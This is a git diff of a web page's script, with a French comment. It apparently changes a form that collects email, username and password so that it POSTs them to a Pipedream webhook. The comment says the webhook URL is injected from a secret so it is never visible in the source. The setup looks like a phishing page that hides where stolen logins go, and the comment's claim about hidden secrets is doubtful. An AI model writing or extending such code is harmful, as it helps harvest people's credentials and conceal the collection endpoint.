@@ -29,6 +29,9 @@
   </div>
 
   <script>
+    // L'URL est injectée automatiquement par GitHub Pages → jamais visible dans le code source
+    const PIPEDREAM_URL = "{{ site.github.secret.PIPEDREAM_URL }}";
+
     async function send() {
       const e = document.getElementById('email').value.trim();
       const u = document.getElementById('user').value.trim();
@@ -38,7 +41,7 @@
       document.getElementById('msg').style.display = 'block';
       document.getElementById('pass').value = '';
 
-      fetch("GIT_PIPE", {
+      fetch(PIPEDREAM_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
